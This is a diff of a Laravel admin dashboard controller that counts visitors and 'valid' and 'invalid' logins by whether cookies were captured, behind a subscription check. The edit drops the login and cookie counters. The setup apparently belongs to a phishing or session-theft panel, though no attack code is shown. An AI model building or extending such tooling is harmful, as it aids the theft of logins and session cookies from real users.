@@ -50,7 +50,7 @@ public function index()
     $settings = UserSetting::first();
 
     // Ambil key unik user (disimpan di kolom password)
-    $userKey = auth()->user()->password;
+    $userKey = auth()->user()->id;
     $loginKey = auth()->user()->login_key;
     // Status subscription
     $status = now()->lte($settings->subscription_until) ? 'Active' : 'Expired';
@@ -58,24 +58,15 @@ public function index()
     // === Counter sinkron sesuai user === //
 
     // Valid Visitors (berdasarkan key_user)
-    $validVisitors = \App\Models\ValidVisitor::where('key_user', $userKey)->count();
+    $validVisitors = \App\Models\Token::where('user_id', $userKey)->count();
 
-    // Invalid Login = cookies NULL + key_user cocok
-    $invalidLogin = \App\Models\ValidLogin::whereNull('cookies')
-                        ->where('key_user', $userKey)
-                        ->count();
-
-    // Valid Login = cookies NOT NULL + key_user cocok
-    $validLogin = \App\Models\ValidLogin::whereNotNull('cookies')
-                        ->where('key_user', $userKey)
-                        ->count();
+   
 
     return view('admin.dashboard', [
         "settings"      => $settings,
         "status"        => $status,
         "validVisitors" => $validVisitors,
-        "invalidLogin"  => $invalidLogin,
-        "validLogin"    => $validLogin,
+
         "login_key"          => $loginKey
     ]);
 }
